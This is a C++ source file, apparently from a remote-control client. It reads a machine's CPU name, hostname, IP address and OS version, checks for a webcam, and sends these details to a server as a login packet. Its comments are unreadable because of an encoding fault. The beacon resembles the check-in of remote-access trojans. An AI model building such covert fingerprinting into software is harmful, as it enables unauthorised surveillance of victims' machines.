#include "pch.h"
#include "Login.h"
#include "Common.h"


LONG GetProcessorName(char* ProcessorName, ULONG* ProcessorNameLength)
{
	HKEY	 KeyHandle;
	LONG Status;

	//ͨ��ע��� 5������
	//regedit
	DWORD	Type = REG_SZ;
	Status = RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
		&KeyHandle);  //���ע�������
	if (Status != ERROR_SUCCESS)
	{
		return Status;
	}
	Status = RegQueryValueEx(KeyHandle, "ProcessorNameString",
		NULL, &Type, (LPBYTE)ProcessorName, ProcessorNameLength);
	RegCloseKey(KeyHandle);
	return Status;
}
BOOL IsWebCamera()
{
	BOOL	IsOk = FALSE;
	CHAR	v1[MAX_PATH];
	//�����豸(����ͷ USB ��ӡ��)  -----   
	for (int i = 0; i < 10 && !IsOk; i++)
	{
		IsOk = capGetDriverDescription(i, v1, sizeof(v1), NULL, 0);
	}
	return IsOk;
}

int SendLoginInformation(CIocpClient* IocpClient, DWORD WebSpeed)
{
	int Status;
	LOGIN_INFORMAITON LoginInfo = { 0 };

	LoginInfo.IsToken = CLIENT_LOGIN;

	//��õ�ǰ�ͻ���IP��ַ
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(sockaddr_in));
	int ClientAddressLength = sizeof(sockaddr_in);
	getsockname(IocpClient->m_ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);

	//����ṹ��
	LoginInfo.ClientAddress = ClientAddress.sin_addr;

	//��õ�ǰ�ͻ���HostName
	gethostname(LoginInfo.HostName, MAX_PATH);

	//��õ�ǰ�ͻ���CPU�ͺ�
	ULONG ProcessNameLength = MAX_PATH;
	Status = GetProcessorName(LoginInfo.ProcessorName, &ProcessNameLength);

	//�жϵ�ǰ�ͻ�����������ͷ
	LoginInfo.IsWebCameraExist = IsWebCamera();

	//��õ�ǰ�ͻ���ϵͳ�汾��Ϣ
	LoginInfo.OsVersionInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionExA((OSVERSIONINFO*)&LoginInfo.OsVersionInfoEx);

	int ReturnLength = 0;
	ReturnLength = IocpClient->OnSending((char*)&LoginInfo, sizeof(LOGIN_INFORMAITON));   //�������ݵ�������
	return ReturnLength;

}
